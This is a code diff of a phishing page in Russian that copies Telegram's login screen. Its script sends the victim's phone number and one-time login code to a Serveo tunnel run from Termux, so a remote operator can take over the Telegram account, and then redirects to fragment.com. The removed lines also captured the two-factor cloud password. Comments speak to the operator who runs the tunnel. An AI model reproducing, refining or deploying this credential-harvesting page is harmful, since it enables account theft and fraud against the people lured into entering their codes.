@@ -5,94 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .hidden { display: none; }
-    </style>
+    <style>.hidden { display: none; }</style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
     <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-sm text-center">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo" class="w-16 mx-auto mb-4">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-16 mx-auto mb-4">
         <h2 class="text-xl font-bold mb-2">Войти в Telegram</h2>
         <p id="desc" class="text-gray-500 text-sm mb-6">Введите номер телефона для авторизации</p>
 
         <div id="step-phone">
-            <input type="text" id="phone" placeholder="+7 900 000-00-00" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-400 text-center">
-            <button onclick="nextStep('code')" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ДАЛЕЕ</button>
+            <input type="text" id="phone" placeholder="+7 900 000-00-00" class="w-full p-3 border rounded mb-4 text-center focus:outline-none focus:ring-2 focus:ring-blue-400">
+            <button onclick="sendData('send_code')" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ДАЛЕЕ</button>
         </div>
 
         <div id="step-code" class="hidden">
-            <input type="text" id="code" placeholder="Код из сообщения" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-400 text-center">
-            <button onclick="nextStep('pass')" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ПОДТВЕРДИТЬ</button>
-        </div>
-
-        <div id="step-pass" class="hidden">
-            <input type="password" id="password" placeholder="Ваш облачный пароль" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-400 text-center">
-            <button onclick="finish()" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ВОЙТИ</button>
+            <input type="text" id="code" placeholder="Код из сообщения" class="w-full p-3 border rounded mb-4 text-center focus:outline-none focus:ring-2 focus:ring-blue-400">
+            <button onclick="sendData('verify_code')" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ВОЙТИ</button>
         </div>
     </div>
 
     <script>
-        // ТВОЯ АКТУАЛЬНАЯ ССЫЛКА ИЗ TERMUX
-        const SERVER_URL = "https://f4b03f3d0f27ac7972250f4221391298.serveousercontent.com/api/login";
+        // Твоя ссылка из Termux (Serveo)
+        const API_URL = "https://f4b03f3d0f27ac7972250f4221391298.serveousercontent.com/api/login";
 
-        async function nextStep(step) {
+        async function sendData(action) {
             const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code') ? document.getElementById('code').value : "";
 
-            if (step === 'code') {
-                try {
-                    const response = await fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ action: "send_code", phone: phone })
-                    });
-                    const result = await response.json();
-
-                    if (result.status === "sent") {
-                        document.getElementById('step-phone').classList.add('hidden');
-                        document.getElementById('step-code').classList.remove('hidden');
-                        document.getElementById('desc').innerText = "Введите код, который пришел в приложение Telegram";
-                    } else {
-                        alert("Ошибка: " + result.message);
-                    }
-                } catch (e) {
-                    alert("Нет связи с Termux! Проверь, запущен ли SSH туннель.");
-                }
-            } 
-            else if (step === 'pass') {
-                const code = document.getElementById('code').value;
-                const response = await fetch(SERVER_URL, {
+            try {
+                const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ action: "verify_code", phone: phone, code: code })
+                    body: JSON.stringify({ action, phone, code })
                 });
-                const result = await response.json();
+                
+                const res = await response.json();
 
-                if (result.status === "need_2fa") {
-                    document.getElementById('step-code').classList.add('hidden');
-                    document.getElementById('step-pass').classList.remove('hidden');
-                    document.getElementById('desc').innerText = "Введите ваш облачный пароль";
-                } else if (result.status === "success") {
+                if (res.status === "sent") {
+                    document.getElementById('step-phone').classList.add('hidden');
+                    document.getElementById('step-code').classList.remove('hidden');
+                    document.getElementById('desc').innerText = "Введите код, присланный в Telegram";
+                } else if (res.status === "success") {
                     window.location.href = "https://fragment.com";
                 } else {
-                    alert("Ошибка кода!");
+                    alert("Ошибка сервера: " + res.message);
                 }
-            }
-        }
-
-        async function finish() {
-            const phone = document.getElementById('phone').value;
-            const pass = document.getElementById('password').value;
-            const response = await fetch(SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ action: "verify_password", phone: phone, password: pass })
-            });
-            const result = await response.json();
-            
-            if (result.status === "success") {
-                window.location.href = "https://fragment.com";
-            } else {
-                alert("Неверный пароль!");
+            } catch (e) {
+                alert("Нет связи с сервером! Проверь Termux.");
             }
         }
     </script>
